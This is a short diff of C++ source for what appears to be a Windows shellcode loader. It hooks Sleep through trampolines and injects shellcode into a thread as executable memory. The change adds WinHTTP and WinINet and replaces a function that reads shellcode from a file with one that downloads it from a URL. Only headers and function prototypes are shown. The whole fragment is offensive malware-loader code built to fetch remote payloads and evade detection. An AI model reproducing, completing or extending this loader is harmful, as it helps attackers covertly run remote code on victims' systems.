@@ -5,6 +5,11 @@
 #include <sstream>
 #include <iomanip>
 #include <vector>
+#include <winhttp.h>
+#include <wininet.h>
+
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "wininet.lib")
 
 typedef void  (WINAPI* typeSleep)(
     DWORD dwMilis
@@ -49,6 +54,6 @@ static const DWORD Shellcode_Memory_Protection = PAGE_EXECUTE_READ;
 bool hookSleep();
 void runShellcode(LPVOID param);
 bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread);
-bool readShellcode(const char* path, std::vector<uint8_t>& shellcode);
+bool downloadShellcode(const char* url, std::vector<uint8_t>& shellcode);
 bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers = NULL);
 void WINAPI MySleep(DWORD _dwMilliseconds);
